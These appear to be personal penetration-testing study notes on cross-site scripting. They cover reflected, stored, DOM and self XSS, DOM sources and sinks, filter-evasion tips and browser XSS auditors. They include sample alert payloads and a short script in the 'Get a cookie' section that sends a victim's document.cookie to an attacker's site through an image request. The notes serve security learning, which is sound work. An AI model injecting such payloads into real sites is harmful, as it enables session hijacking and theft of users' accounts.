# XSS - Cross-Site Scripting

## Introduction

* An XSS vulnerability lets you inject a malicious script on a website
  * One notable use is to steal cookies
* Where to find XSS :
  * Any input on a website really \(if it's not properly sanitized\)
  * Concatenated http parameter pollution
  * Url of action form : `javascript:alert(1337)`
  * Url :
    *  `data:text/html,<script>alert(0)</script>`
    * URL parameters that renders on the page
* Example of XSS payloads available at [https://github.com/cure53/H5SC](https://github.com/cure53/H5SC)

## Types

* **Reflected** : The input is sent to the server and reflected on the page
* **Stored** : Same but the input is also **persisted** in a db of some sort
* **DOM** : The input is directly inserted into the DOM \(without being sent to the server at all\)
  * **Sources** \(where the input goes\) :
    * `document.url`, `document.referrer`
    * `location`, `location.href`, `location.search`, `location.hash`, `location.pathname`
    * etc
  * **Sinks** \(where the input ends up\) :
    * `element.innerHTML()`, `element.outerHTML()`
    * `eval()`
    * `setTimeout()`, `setInterval()`
    * `document.write()`, `document.writeln()`
    * etc
  * A `<script>alert();</script>` inserted via `inner.html` won't be executed
* **Self** : Impact only the user entering the payload
  * Rarely useful without some sort of social engineering
    * However, they can be. Read this [article](https://whitton.io/articles/uber-turning-self-xss-into-good-xss/)

### Polygots

XSS payloads made from a mixture of encoding/repetition/comments/etc that make it possible to pass filter/black list/etc. They're hard to read.

## Tips

* Use lists with _burp intruder_
* If `<script>` aren't accepted, use events like `onfocus`, `onload`, etc
* `google.com/jsapi?callback=alert` can be used to received a function in a callback
* Check : [Bypassing Sanitizers](https://zcugni.gitbook.io/notes/pen-test/vulnerabilities#bypassing-sanitizers) & the [Owasp Cheat Sheet](https://www.owasp.org/index.php/XSS_Filter_Evasion_Cheat_Sheet)

## XSS Auditor

* Mechanism used by browsers to detect XSS and prevent them
* However, they often introduce other vulnerabilities and gives a false impression of security
  * For this reason, a lot of browsers have stopped using them
  * For example, in Chrome it detected an injection \(in part\) by comparing what was given in the url with the content of the scripts in the page
    * But that could be abused to inject in the url a valid part of the script, so that the auditor would disable it

{% hint style="info" %}
Read this : [https://blog.innerht.ml/the-misunderstood-x-xss-protection/](https://blog.innerht.ml/the-misunderstood-x-xss-protection/)

Check this : [https://github.com/masatokinugawa/filterbypass/wiki/Browser's-XSS-Filter-Bypass-Cheat-Sheet](https://github.com/masatokinugawa/filterbypass/wiki/Browser's-XSS-Filter-Bypass-Cheat-Sheet)
{% endhint %}

## Get a cookie

By example by injecting this script :

```javascript
<script>
    document.write("<img src='...'?c="+document.cookie+"'/>");
</script>
```

The img will be added to the page and request it's source \(the attacker website\) with the cookie attached to it.

## Sources

* [Owasp testing guide v4](https://owasp.org/www-project-web-security-testing-guide/assets/archive/OWASP_Testing_Guide_v4.pdf)
* PwnFunction's [video](https://www.youtube.com/watch?v=EoaDgUgS6QA)
* [LiveOverflow](https://www.youtube.com/channel/UClcE-kVhqyiHCcjYwcpfj9w)'s multiple videos
* _Real-World Bug Hunting: A Field Guide to Web_ Hacking by Peter Yaworski
* Misc research

